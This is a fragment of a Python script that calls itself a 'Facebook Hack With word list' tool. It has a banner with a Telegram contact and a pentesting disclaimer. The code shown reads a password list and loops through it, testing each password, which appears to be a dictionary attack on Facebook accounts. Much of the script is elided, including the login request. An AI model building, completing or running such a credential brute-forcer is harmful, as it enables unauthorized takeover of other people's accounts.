...
__banner__ = """
       ...
       |..........Facebook  password...........|
       +---------------------------------------+
       |Facebook Hack With word list           |
       |#Contact: Telegram @tabloseg           |
       |#Date: Fri Feb 8 10:15:49 2022         |
       |#This tool is made for pentesting.     |
       |#Changing the description of this tool |
       |++)____Won't made you the coder        |
       |#Tablos\  *_* Hello Anonymous          |
...
try:
	...
	if os.path.exists(passlist) != False:
		...
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Testing {}".format(passwd.strip()))
			sys.stdout.flush()
